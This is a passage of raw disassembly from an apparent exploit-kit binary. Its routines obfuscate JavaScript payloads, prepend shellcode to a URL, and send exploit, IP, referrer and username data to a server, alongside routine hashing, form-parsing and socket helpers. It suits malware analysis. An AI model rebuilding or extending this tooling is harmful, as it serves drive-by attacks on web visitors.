add esp, 0x10
test eax, eax
je 0x804970c
sub esp, 8
push 0x20
push dword [log_data]
call dbg.client_send_data
add esp, 0x10
test eax, eax
je 0x804970c
test ebx, ebx
je 0x8049728
sub esp, 8
push ebx
push dword [http_referer]
call dbg.client_send_data
add esp, 0x10
test eax, eax
jne 0x8049728
nop
sub esp, 0xc
push esi
call sym.imp.free
add esp, 0x10
call dbg.client_close
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
nop
sub esp, 0xc
lea eax, [len]
push eax
call dbg.client_recv_reply
add esp, 0x10
test eax, eax
mov edi, eax
je 0x8049747
mov al, byte [eax]
mov byte [esi], al
cmp dword [len], 1
ja 0x8049766
call dbg.client_close
test edi, edi
je 0x804975c
sub esp, 0xc
push edi
call sym.imp.free
add esp, 0x10
lea esp, [var_ch]
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
sub esp, 0xc
lea eax, [edi + 1]
push eax
call dbg.xstrdup
add esp, 0x10
mov dword [esi + 4], eax
jmp 0x8049747
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x5c
mov ebx, dword [arg_8h]
mov al, byte [arg_10h]
xor esi, esi
test ebx, ebx
mov edi, dword [arg_ch]
mov byte [ret_buf], al
mov dword [retval], 0
mov dword [source_output], 0
je 0x804b80d
test edi, edi
jne 0x804b830
sub esp, 0xc
movsx eax, byte [ret_buf]
push eax
push edi
push ebx
push str.js_crypter_encode__p___d___d_
push 6
call dbg.seterror
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
sub esp, 0xc
push 0
call sym.imp.time
mov dword [esp], eax
call sym.imp.srand
add esp, 0xc
lea eax, [size]
push eax
push edi
push ebx
call dbg.js_crypter_html_to_wchar
mov dword [encoded_string_converted], eax
mov ecx, dword [encoded_string_converted]
add esp, 0x10
xor eax, eax
test ecx, ecx
je 0x804b825
call dbg.js_crypter_make_vars
test eax, eax
je 0x804bcee
xor eax, eax
cld
mov edi, obj.source_fmt
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
sub esp, 0xc
add ecx, 0xffff
push ecx
call dbg.xmalloc
add esp, 0x10
test eax, eax
mov dword [source_output], eax
je 0x804bcee
xor edi, edi
call dbg.js_randomizer
mov dword [ebp + edi*4 - 0x38], eax
inc edi
cmp edi, 6
jbe 0x804b89c
sub esp, 0xc
push dword [var_20h]
push dword [var_24h]
push 0x8056420
push 0x8056300
push 0x80563a0
push 0x8056420
push 0x8056400
push 0x80563a0
push 0x8056400
push 0x80563a0
push 0x8056400
push 0x8056400
push 0x80563a0
push 0x8056400
push 0x8056300
push 0x80563e0
push 0x8056340
push 0x8056340
push 0x8056280
push 0x8056340
push 0x8056340
push 0x8056280
push 0x8056360
push 0x80563a0
push 0x8056380
push 0x8056360
push 0x8056300
push obj.my_vars
push 0x8056380
push 0x8056300
push obj.my_vars
push 0x8056380
push 0x8056380
push 0x80563e0
push 0x8056300
push 0x8056340
push 0x8056340
push 0x8056280
push 0x8056340
push 0x8056340
push 0x8056280
push 0x8056360
push 0x80563e0
push 0x8056380
push 0x8056360
push 0x8056300
push obj.my_vars
push 0x8056380
push 0x8056300
push obj.my_vars
push 0x8056380
push 0x8056380
push 0x80563a0
push 0x80563e0
push 0x8056300
push obj.my_vars
push 0x8056300
push 0x8056300
push 0x8056420
push 0x80563e0
push 0x8056380
push 0x8056360
push 0x8056340
push 0x8056300
push 0x80562c0
push 0x80562e0
push 0x8056280
push 0x80562e0
push 0x80562e0
push 0x80562e0
push 0x8056240
push 0x80562e0
push 0x8056220
push 0x8056240
push 0x80562c0
push 0x80562c0
push 0x80562c0
push 0x8056240
push 0x80562c0
push 0x8056220
push 0x8056240
push 0x80562e0
push 0x80562c0
push 0x8056220
push 0x8056220
push 0x8056220
push 0x8056240
push 0x8056200
push 0x8056220
push 0x80562a0
push 0x8056220
push 0x8056240
push 0x8056260
push 0x8056240
push 0x8056240
push 0x8056220
push 0x8056300
push 0x8056320
push 0x80562a0
push 0x8056300
push 0x8056320
push 0x80562a0
push 0x8056240
push 0x8056320
push 0x80562a0
push 0x8056300
push 0x8056320
push 0x80562a0
push 0x8056300
push 0x8056320
push 0x8056320
push 0x8056320
push 0x8056240
push 0x8056240
push 0x8056240
push 0x8056300
push 0x8056300
push 0x8056300
push 0x8056240
push 0x8056300
push 0x80562a0
push 0x8056300
push 0x8056300
push 0x8056300
push 0x80562a0
push 0x80563a0
push dword [var_28h]
push 0x8056280
push dword [var_2ch]
push 0x8056220
push dword [var_30h]
push 0x8056200
push 0x8056260
push dword [var_34h]
push 0x8056240
push dword [r]
push 0x8056200
push obj.my_vars
push 0x80563c0
push obj.source_fmt
push dword [source_output]
call sym.imp.sprintf
xor edi, edi
add esp, 0x240
jmp 0x804bb76
mov esi, esi
inc edi
cmp edi, 6
ja 0x804bb98
mov eax, dword [ebp + edi*4 - 0x38]
test eax, eax
je 0x804bb70
sub esp, 0xc
push eax
call sym.imp.free
mov dword [ebp + edi*4 - 0x38], 0
inc edi
add esp, 0x10
cmp edi, 6
jbe 0x804bb76
xor eax, eax
cld
mov edi, dword [source_output]
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
sub esp, 8
dec ecx
push ecx
push dword [source_output]
mov dword [size_source], ecx
call dbg.js_crypter_validate
mov ebx, eax
add esp, 0x10
xor eax, eax
test ebx, ebx
je 0x804b825
sub esp, 0xc
push ebx
call dbg.upcase
pop eax
pop edx
push 0
push ebx
call dbg.Crc32Str
add esp, 0xc
push eax
push str._08x
lea esi, [crc]
push esi
call sym.imp.sprintf
mov edi, esi
mov dword [esp], ebx
call sym.imp.free
mov dword [esp], esi
call dbg.upcase
xor eax, eax
mov byte [var_40h], 0
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
push ecx
push dword [size]
push esi
push dword [encoded_string_converted]
call dbg.js_crypter_alg
add esp, 0x20
test eax, eax
mov esi, eax
je 0x804bcee
cmp byte [ret_buf], 0
je 0x804bccc
mov edi, eax
cld
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
mov edi, dword [size_source]
sub esp, 0xc
lea ecx, [ecx + edi + 0x3ff]
push ecx
call dbg.xmalloc
add esp, 0x10
test eax, eax
mov dword [retval], eax
je 0x804bcee
sub esp, 0xc
push esi
push 0x80563c0
push dword [source_output]
push str._s_n_s__s__
push eax
call sym.imp.sprintf
mov eax, dword [encoded_string_converted]
add esp, 0x20
test eax, eax
je 0x804bc90
sub esp, 0xc
push dword [encoded_string_converted]
call sym.imp.free
add esp, 0x10
mov eax, dword [source_output]
test eax, eax
je 0x804bca5
sub esp, 0xc
push dword [source_output]
call sym.imp.free
add esp, 0x10
test esi, esi
je 0x804bcb5
sub esp, 0xc
push esi
call sym.imp.free
add esp, 0x10
cmp byte [ret_buf], 0
mov eax, dword [retval]
jne 0x804b825
mov eax, 0xffffffff
jmp 0x804b825
sub esp, 8
push obj.document_footer
push eax
push 0x80563c0
push dword [source_output]
push obj.document_header
push str._s_s_n_s__s___s
call sym.imp.printf
jmp 0x804bc78
mov eax, dword [encoded_string_converted]
test eax, eax
je 0x804bd03
sub esp, 0xc
push dword [encoded_string_converted]
call sym.imp.free
add esp, 0x10
mov eax, dword [source_output]
test eax, eax
je 0x804bd18
sub esp, 0xc
push dword [source_output]
call sym.imp.free
add esp, 0x10
test esi, esi
je 0x804b823
sub esp, 0xc
push esi
call sym.imp.free
add esp, 0x10
jmp 0x804b823
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x9c
mov eax, dword [arg_14h]
test eax, eax
mov edi, dword [arg_8h]
jne 0x804c298
mov dword [ebp - 0xa0], 5
mov dword [var_9ch], 0
lea edx, [fd_read]
mov eax, 0x20
lea esi, [esi]
dec eax
test eax, eax
mov dword [edx + eax*4], 0
jne 0x804c230
mov esi, edi
and esi, 0x1f
mov ecx, esi
mov ebx, edi
mov al, 1
shl eax, cl
shr ebx, 5
or dword [ebp + ebx*4 - 0x98], eax
xor ecx, ecx
test edi, edi
jle 0x804c28e
sub esp, 0xc
lea eax, [ebp - 0xa0]
push eax
push 0
push 0
push edx
mov eax, dword [obj.high_sock]
inc eax
push eax
call sym.imp.select
add esp, 0x20
xor ecx, ecx
test eax, eax
jle 0x804c28e
mov ecx, esi
mov eax, dword [ebp + ebx*4 - 0x98]
shr eax, cl
xor ecx, ecx
test al, 1
jne 0x804c2a3
lea esp, [var_ch]
pop ebx
pop esi
mov eax, ecx
pop edi
leave
ret
mov dword [ebp - 0xa0], eax
jmp 0x804c218
push ecx
push dword [len]
push dword [buf]
push edi
call sym.imp.read
lea esp, [var_ch]
pop ebx
pop esi
mov ecx, eax
mov eax, ecx
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov ebx, dword [arg_8h]
xor esi, esi
cmp ebx, 0x1e
ja 0x804b114
sub esp, 8
mov byte [ebp + ebx - 0x38], 0
push 0
push str._dev_urandom
call sym.imp.open
add esp, 0x10
cmp eax, 0xffffffff
mov edi, eax
je 0x804b0d0
push eax
push ebx
lea eax, [buf]
push eax
push edi
call sym.imp.read
add esp, 0x10
cmp eax, ebx
je 0x804b091
mov esi, 1
sub esp, 0xc
push edi
call sym.imp.close
mov eax, esi
add esp, 0x10
dec al
je 0x804b0d0
nop
xor eax, eax
cld
mov edi, obj.ret.0
mov ecx, 0xf
rep stosd dword es:[edi], eax
stosw word es:[edi], ax
stosb byte es:[edi], al
push eax
push obj.ret.0
push ebx
lea eax, [buf]
push eax
call dbg.js_crypter_str_to_hex
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov esi, esi
xor edi, edi
cmp edi, ebx
jge 0x804b0a4
mov esi, esi
call sym.imp.rand
push eax
fild dword [esp]
fnstcw word [ebp - 0x3a]
mov ax, word [var_3ah]
fmul dword [0x804ee8c]
mov ah, 0xc
mov word [var_3ch], ax
fmul dword [0x804ee90]
fldcw word [ebp - 0x3c]
fistp dword [ebp - 0x40]
fldcw word [ebp - 0x3a]
mov eax, dword [var_40h]
mov byte [ebp + edi - 0x38], al
add esp, 4
inc edi
cmp edi, ebx
jl 0x804b0d8
jmp 0x804b0a4
push eax
push ebx
push str.js_crypter_rand_hex__d___count___sizeof_buf_
push 6
call dbg.seterror
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0xc
mov ebx, dword [arg_8h]
push 3
push ebx
call sym.imp.fcntl
add esp, 0x10
test eax, eax
js 0x804c10c
push eax
push 4
push 4
push ebx
call sym.imp.fcntl
add esp, 0x10
test eax, eax
mov edx, 1
js 0x804c122
mov eax, edx
mov ebx, dword [var_4h]
leave
ret
nop
sub esp, 0xc
push str.fcntl_F_GETFL_
call sym.imp.puts
xor edx, edx
mov eax, edx
mov ebx, dword [var_4h]
leave
ret
sub esp, 0xc
push str.fcntl_F_SETFL_
jmp 0x804c114
jmp dword [reloc.fcntl]
jmp dword [reloc.puts]
push ebp
mov ebp, esp
push edi
push ebx
mov ebx, dword [arg_8h]
test ebx, ebx
je 0x804d6ae
xor eax, eax
mov edi, ebx
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
xor edx, edx
xor edi, edi
cmp edx, ecx
jae 0x804d6a1
nop
mov al, byte [ebx + edx]
cmp al, 0x20
je 0x804d69c
cmp al, 0xd
je 0x804d69c
cmp al, 0xa
je 0x804d69c
cmp al, 9
je 0x804d69c
cmp edi, edx
je 0x804d69a
mov byte [ebx + edi], al
inc edi
nop
inc edx
cmp edx, ecx
jb 0x804d680
mov byte [ebx + edi], 0
mov eax, ebx
lea esp, [var_8h]
pop ebx
pop edi
leave
ret
push eax
push 0
push str.strnospaces__p_
push 6
call dbg.seterror
xor eax, eax
jmp 0x804d6a7
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edx, 0xffffffff
xor eax, eax
mov edi, dword [str]
cld
mov ecx, edx
repne scasb al, byte es:[edi]
not ecx
mov esi, dword [arg_ch]
lea ebx, [ecx - 1]
mov edi, esi
mov ecx, edx
repne scasb al, byte es:[edi]
not ecx
dec ecx
cmp ebx, ecx
mov eax, 1
je 0x804d3a8
pop ebx
pop esi
pop edi
leave
ret
xor edi, edi
jmp 0x804d3b7
movsx eax, dl
add eax, 0x20
cmp ecx, eax
jne 0x804d3e7
inc edi
cmp edi, ebx
jae 0x804d3e0
mov edx, dword [str]
mov al, byte [edx + edi]
movsx ecx, al
sub eax, 0x41
cmp al, 0x19
ja 0x804d3ce
add ecx, 0x20
mov dl, byte [esi + edi]
lea eax, [edx - 0x41]
cmp al, 0x19
jbe 0x804d3ac
movsx eax, dl
jmp 0x804d3b2
lea esi, [esi]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
pop ebx
pop esi
mov eax, 1
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x9c
mov eax, dword [arg_14h]
test eax, eax
mov edi, dword [arg_8h]
jne 0x804c1d0
mov dword [ebp - 0xa0], 5
mov dword [var_9ch], 0
lea edx, [fd_write]
mov eax, 0x20
lea esi, [esi]
dec eax
test eax, eax
mov dword [edx + eax*4], 0
jne 0x804c168
mov esi, edi
and esi, 0x1f
mov ecx, esi
mov ebx, edi
mov al, 1
shl eax, cl
shr ebx, 5
or dword [ebp + ebx*4 - 0x98], eax
xor ecx, ecx
test edi, edi
jle 0x804c1c6
sub esp, 0xc
lea eax, [ebp - 0xa0]
push eax
push 0
push edx
push 0
mov eax, dword [obj.high_sock]
inc eax
push eax
call sym.imp.select
add esp, 0x20
xor ecx, ecx
test eax, eax
jle 0x804c1c6
mov ecx, esi
mov eax, dword [ebp + ebx*4 - 0x98]
shr eax, cl
xor ecx, ecx
test al, 1
jne 0x804c1db
lea esp, [var_ch]
pop ebx
pop esi
mov eax, ecx
pop edi
leave
ret
mov dword [ebp - 0xa0], eax
jmp 0x804c150
push edx
push dword [len]
push dword [buf]
push edi
call sym.imp.write
lea esp, [var_ch]
pop ebx
pop esi
mov ecx, eax
mov eax, ecx
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
push eax
mov ebx, dword [arg_8h]
test ebx, ebx
je 0x804d73b
sub esp, 0xc
push ebx
call sym.imp.strdup
add esp, 0x10
test eax, eax
je 0x804d721
mov ebx, dword [var_4h]
leave
ret
sub esp, 8
push ebx
push str.error:_out_of_memory_in_function_xstrdup__p__
call sym.imp.printf
mov dword [esp], 0
call sym.imp.exit
push eax
push 0
push str.xstrdup__p_
push 6
call dbg.seterror
xor eax, eax
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.strdup]
push ebp
mov ebp, esp
push ebx
push eax
mov ebx, dword [arg_8h]
test ebx, ebx
je 0x804a1ee
cmp dword [obj.fd], 0xffffffff
je 0x804a1dc
push 0
push 0x20
push ebx
push dword [obj.fd]
call sym.imp.send
add esp, 0x10
test eax, eax
jle 0x804a1fa
cmp eax, 0x20
mov edx, 1
je 0x804a1d3
push 0x20
push eax
push str.len___d__must_be__d
push 7
call dbg.seterror
xor edx, edx
mov eax, edx
mov ebx, dword [var_4h]
leave
ret
mov esi, esi
call dbg.client_connect
xor edx, edx
test eax, eax
jne 0x804a1a1
mov eax, edx
mov ebx, dword [var_4h]
leave
ret
push ebx
push 0
push str.client_send_request__p_
push 6
jmp 0x804a1cc
sub esp, 0xc
push 3
jmp 0x804a1cc
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov ebx, dword [arg_8h]
mov al, byte [arg_ch]
mov edi, dword [ebx + 0xc]
mov byte [exploit], al
cld
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
add ecx, 0x1ff
push ecx
call dbg.xmalloc
add esp, 0xc
push dword [username]
push dword [ebx + 4]
push dword [ebx + 0x20]
mov esi, eax
call dbg.get_ip_hash
mov dword [esp], eax
push dword [additional]
movzx eax, byte [exploit]
push eax
movzx eax, word [ebx + 2]
push eax
movzx eax, byte [ebx + 1]
push eax
movzx eax, byte [ebx]
push eax
push dword [ebx + 0xc]
push str._s_u_hhu__hhu__u__hhu__lu__u__u__u
push esi
call sym.imp.sprintf
lea esp, [var_ch]
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push dword [ip]
call sym.imp.__inet_addr
xor ah, 1
mov dword [hash], eax
pop eax
pop edx
push 4
lea eax, [hash]
push eax
call dbg.Crc32Str
leave
ret
jmp dword [reloc.__inet_addr]
push ebp
mov ebp, esp
push edi
push esi
mov esi, dword [arg_8h]
xor eax, eax
test esi, esi
push ebx
mov ebx, dword [arg_ch]
je 0x804a350
test ebx, ebx
je 0x804a358
mov edx, 0xffffffff
xor edi, edi
jmp 0x804a348
nop
movzx eax, byte [esi + edi]
push eax
push edx
call dbg.Crc32Add
pop edx
pop ecx
mov edx, eax
inc edi
cmp edi, ebx
jb 0x804a338
mov eax, edx
not eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cld
mov ecx, 0xffffffff
mov edi, esi
repne scasb al, byte es:[edi]
not ecx
lea ebx, [ecx - 1]
jmp 0x804a32e
jmp dword [reloc.sprintf]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
mov ebx, dword [size]
push ebx
mov esi, dword [nmeb]
push esi
call sym.imp.calloc
add esp, 0x10
test eax, eax
je 0x804dad3
lea esp, [var_8h_2]
pop ebx
pop esi
leave
ret
push eax
push ebx
push esi
push str.error:_out_of_memory_in_function_xcalloc__d___d__
call sym.imp.printf
mov dword [esp], 0
call sym.imp.exit
jmp dword [reloc.calloc]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
push 0
mov esi, dword [arg_8h]
push 0
push esi
call dbg.md5_write
mov edx, dword [esi + 0x10]
mov ebx, edx
shl ebx, 6
shr edx, 0x1a
mov ecx, dword [esi + 0x54]
mov dword [msb], edx
mov edx, ebx
add ebx, ecx
add esp, 0x10
cmp ebx, edx
adc dword [msb], 0
mov eax, ebx
shl dword [msb], 3
shr eax, 0x1d
shl ebx, 3
or dword [msb], eax
cmp ecx, 0x37
jg 0x804cd80
lea eax, [ecx + 1]
cmp eax, 0x37
mov byte [ecx + esi + 0x14], 0x80
jg 0x804cd77
lea edx, [ecx + 2]
mov eax, edx
cmp eax, 0x37
mov byte [edx + esi + 0x13], 0
lea edx, [edx + 1]
jle 0x804cd68
lea edx, [esi + 0x14]
mov dword [esi + 0x54], eax
jmp 0x804cdbf
nop
lea eax, [ecx + 1]
cmp eax, 0x3f
mov byte [ecx + esi + 0x14], 0x80
jg 0x804cd9f
lea edx, [ecx + 2]
mov eax, edx
cmp eax, 0x3f
mov byte [edx + esi + 0x13], 0
lea edx, [edx + 1]
jle 0x804cd90
mov dword [esi + 0x54], eax
push edx
push 0
push 0
push esi
call dbg.md5_write
lea edx, [esi + 0x14]
cld
mov ecx, 0xe
xor eax, eax
mov edi, edx
rep stosd dword es:[edi], eax
add esp, 0x10
mov byte [esi + 0x4c], bl
shr ebx, 8
mov byte [esi + 0x4d], bl
shr ebx, 8
mov byte [esi + 0x4e], bl
shr ebx, 8
mov byte [esi + 0x4f], bl
mov al, byte [msb]
mov byte [esi + 0x50], al
shr dword [msb], 8
mov al, byte [msb]
mov byte [esi + 0x51], al
mov byte [esi + 0x52], 0
mov eax, esi
mov byte [esi + 0x53], 0
call dbg.transform
mov eax, 0x68
call dbg.burn_stack
mov eax, dword [esi]
mov dword [esi + 0x14], eax
mov eax, dword [esi + 4]
mov dword [esi + 0x18], eax
mov eax, dword [esi + 8]
mov dword [esi + 0x1c], eax
mov eax, dword [esi + 0xc]
mov dword [esi + 0x20], eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov ecx, dword [arg_8h]
mov dl, byte [ecx]
test dl, dl
je 0x804d5a7
lea eax, [edx - 0x61]
cmp al, 0x19
ja 0x804d5a0
sub edx, 0x20
mov byte [ecx], dl
inc ecx
mov dl, byte [ecx]
test dl, dl
jne 0x804d594
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov edx, dword [pform]
test edx, edx
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
mov esi, dword [arg_14h]
mov dword [all_form], 0
mov dword [len], 0
je 0x804ad54
test eax, eax
je 0x804ad54
test ebx, ebx
je 0x804ad54
mov edx, dword [pform]
test esi, esi
mov dword [edx], 0
mov dword [edx + 4], 0
jne 0x804ad73
test ebx, ebx
je 0x804ac5e
xor eax, eax
cld
mov ecx, 0xffffffff
mov edi, ebx
repne scasb al, byte es:[edi]
not ecx
mov eax, ecx
dec eax
jne 0x804aded
mov eax, dword [all_form]
test eax, eax
je 0x804ade0
mov ebx, dword [all_form]
jmp 0x804aca0
mov esi, esi
test edi, edi
je 0x804ac80
sub esp, 0xc
push edi
call sym.imp.free
add esp, 0x10
mov edx, dword [value]
test edx, edx
je 0x804ac95
sub esp, 0xc
push dword [value]
call sym.imp.free
add esp, 0x10
test esi, esi
lea ebx, [esi + 1]
je 0x804ade0
sub esp, 8
push 0x26
push ebx
call sym.imp.strchr
add esp, 0x10
test eax, eax
mov esi, eax
je 0x804acb7
mov byte [eax], 0
push eax
push 0
push 0x3d
push ebx
call dbg.strsplit
add esp, 0x10
test eax, eax
mov edi, eax
je 0x804ac95
push eax
push 1
push 0x3d
push ebx
call dbg.strsplit
add esp, 0x10
test eax, eax
mov dword [value], eax
je 0x804ac70
cmp byte [eax], 0
je 0x804ac70
mov ecx, dword [pform]
mov eax, dword [ecx + 4]
sub esp, 8
lea eax, [eax*8 + 8]
push eax
push dword [ecx]
call dbg.xrealloc
mov edx, dword [pform]
add esp, 0x10
test eax, eax
mov dword [var_1ch], eax
mov dword [edx], eax
je 0x804ae3f
mov ecx, dword [pform]
mov ebx, dword [ecx + 4]
sub esp, 0xc
mov eax, dword [var_1ch]
mov dword [eax + ebx*8], edi
push dword [value]
call dbg.urldecode
mov edx, dword [var_1ch]
mov ecx, dword [pform]
mov dword [edx + ebx*8 + 4], eax
mov edx, dword [ecx + 4]
mov eax, dword [ecx]
mov ebx, dword [eax + edx*8 + 4]
add esp, 0x10
test ebx, ebx
je 0x804ae3f
lea eax, [edx + 1]
mov edx, dword [pform]
mov dword [edx + 4], eax
jmp 0x804ac87
nop
sub esp, 8
push esi
push ebx
push eax
push dword [pform]
push str.form_parse__p___p___p___d_
push 6
call dbg.seterror
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
sub esp, 8
push str.post
push eax
call dbg.stricmp
add esp, 0x10
test eax, eax
jne 0x804ac43
sub esp, 0xc
lea eax, [esi + 1]
push eax
call dbg.xmalloc
mov dword [all_form], eax
mov edi, dword [all_form]
add esp, 0x10
xor eax, eax
test edi, edi
je 0x804ad6b
push dword [obj.__stdinp]
push esi
push 1
push dword [all_form]
call sym.imp.fread
add esp, 0x10
cmp eax, esi
je 0x804ae64
sub esp, 0xc
push dword [all_form]
call sym.imp.free
add esp, 0x10
mov dword [all_form], 0
jmp 0x804ac43
lea esi, [esi]
lea esp, [var_ch]
pop ebx
pop esi
mov eax, 1
pop edi
leave
ret
mov edx, dword [len]
sub esp, 8
lea eax, [edx + eax + 1]
push eax
push dword [all_form]
call dbg.xrealloc
mov dword [all_form], eax
mov ecx, dword [all_form]
add esp, 0x10
xor eax, eax
test ecx, ecx
je 0x804ad6b
push ebx
mov edx, dword [len]
test edx, edx
mov eax, 0x804e7e9
jne 0x804ae25
mov eax, 0x804e01f
push eax
push 0x804e2e6
mov eax, dword [all_form]
add eax, dword [len]
push eax
call sym.imp.sprintf
add esp, 0x10
jmp 0x804ac5e
mov ecx, dword [all_form]
test ecx, ecx
je 0x804ae54
sub esp, 0xc
push dword [all_form]
call sym.imp.free
add esp, 0x10
sub esp, 0xc
push dword [pform]
call dbg.form_free
jmp 0x804ad69
mov ecx, dword [all_form]
mov byte [ecx + esi], 0
mov dword [len], esi
jmp 0x804ac43
push ebp
mov ebp, esp
push edi
push ebx
mov ebx, dword [arg_8h]
mov edi, ebx
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea edi, [ecx - 1]
xor ecx, ecx
cmp ecx, edi
jae 0x804d61d
nop
mov dl, byte [ebx + ecx]
lea eax, [edx - 0x41]
cmp al, 0x19
jbe 0x804d618
lea eax, [edx - 0x61]
cmp al, 0x19
jbe 0x804d618
lea eax, [edx - 0x30]
cmp al, 9
ja 0x804d626
inc ecx
cmp ecx, edi
jb 0x804d600
pop ebx
mov eax, 1
pop edi
leave
ret
pop ebx
xor eax, eax
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov eax, dword [last]
mov dword [var_10h], eax
mov edi, dword [url]
cld
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
mov edx, dword [size]
not ecx
lea ebx, [ecx - 1]
add ecx, dword [edx]
push ecx
call sym.imp.malloc
mov esi, eax
add esp, 0xc
mov eax, dword [size]
push dword [eax]
push dword [shellcode]
push esi
call sym.imp.memcpy
add esp, 0xc
mov edx, dword [size]
mov eax, dword [edx]
push ebx
push dword [url]
add eax, esi
push eax
call sym.imp.memcpy
mov eax, dword [size]
add ebx, dword [eax]
mov dl, byte [var_10h]
mov byte [ebx + esi], dl
inc ebx
mov dword [eax], ebx
lea esp, [var_ch]
pop ebx
mov eax, esi
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
push eax
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0xc]
test eax, eax
jne 0x804a848
mov ebx, dword [var_4h]
leave
ret
sub esp, 0xc
push eax
call sym.imp.free
mov dword [ebx + 0xc], 0
add esp, 0x10
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.free]
push ebp
mov ebp, esp
mov edx, dword [str]
xor eax, eax
test edx, edx
push edi
je 0x804dbd1
cld
mov ecx, 0xffffffff
mov edi, dword [str]
repne scasb al, byte es:[edi]
not ecx
lea eax, [ecx - 1]
pop edi
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
mov ebx, dword [size]
push ebx
mov esi, dword [ptr]
push esi
call sym.imp.realloc
add esp, 0x10
test eax, eax
je 0x804da97
lea esp, [var_8h_2]
pop ebx
pop esi
leave
ret
push eax
push ebx
push esi
push str.error:_out_of_memory_in_function_xrealloc__p___d__
call sym.imp.printf
mov dword [esp], 0
call sym.imp.exit
jmp dword [reloc.realloc]
push ebp
mov ebp, esp
push edi
push ebx
mov ebx, dword [arg_8h]
xor eax, eax
mov edi, ebx
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea eax, [ecx - 2]
lea esi, [esi]
mov dl, byte [ebx + eax]
cmp dl, 0xd
je 0x804d5d5
cmp dl, 0xa
jne 0x804d5dc
mov byte [ebx + eax], 0
dec eax
jmp 0x804d5c8
pop ebx
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov eax, dword [str]
xor ebx, ebx
test eax, eax
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
je 0x804afa7
mov ecx, dword [key]
test ecx, ecx
je 0x804afa7
test edi, edi
jne 0x804afc8
sub esp, 8
push esi
push edi
push dword [key]
push dword [str]
push str.js_crypter_alg__p___p___d___d_
push 6
call dbg.seterror
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
test esi, esi
je 0x804afa7
sub esp, 0xc
lea eax, [edi + 1]
push eax
call dbg.xmalloc
mov dword [res], eax
mov edx, dword [res]
add esp, 0x10
xor eax, eax
test edx, edx
je 0x804afc0
xor edx, edx
cmp edx, edi
jae 0x804b014
lea ecx, [esi - 1]
jmp 0x804affa
mov esi, esi
inc ebx
inc edx
cmp edx, edi
jae 0x804b014
mov esi, dword [key]
mov al, byte [esi + ebx]
mov esi, dword [str]
add al, byte [esi + edx]
mov esi, dword [res]
cmp ecx, ebx
mov byte [esi + edx], al
ja 0x804aff4
xor ebx, ebx
jmp 0x804aff5
push eax
push 0
push edi
push dword [res]
call dbg.js_crypter_str_to_hex
mov esi, dword [res]
add esp, 0x10
test esi, esi
mov ebx, eax
je 0x804b03a
sub esp, 0xc
push dword [res]
call sym.imp.free
add esp, 0x10
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 8
push dword [dst]
push dword [src]
push dword [str]
call dbg.strreplace
add esp, 0xc
push 0x40
push eax
push obj.ret.1
mov ebx, eax
call sym.imp.strncpy
mov dword [esp], ebx
call sym.imp.free
mov eax, obj.ret.1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ebx, dword [arg_ch]
test ebx, ebx
mov edi, dword [arg_10h]
je 0x804d820
test edi, edi
je 0x804d830
mov eax, dword [str]
sub esp, 0xc
test eax, eax
je 0x804d814
push eax
call dbg.xstrdup
mov dword [strx], eax
add esp, 0x10
cmp byte [ebx], 0
je 0x804d808
sub esp, 8
push ebx
push eax
call sym.imp.strstr
add esp, 0x10
test eax, eax
mov esi, eax
je 0x804d808
sub esp, 8
mov byte [eax], 0
push edi
push dword [strx]
call dbg.strconcat
add esp, 0xc
mov dword [hlp2], eax
push edi
cld
push ebx
mov edi, ebx
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ecx, [ecx + esi - 1]
push ecx
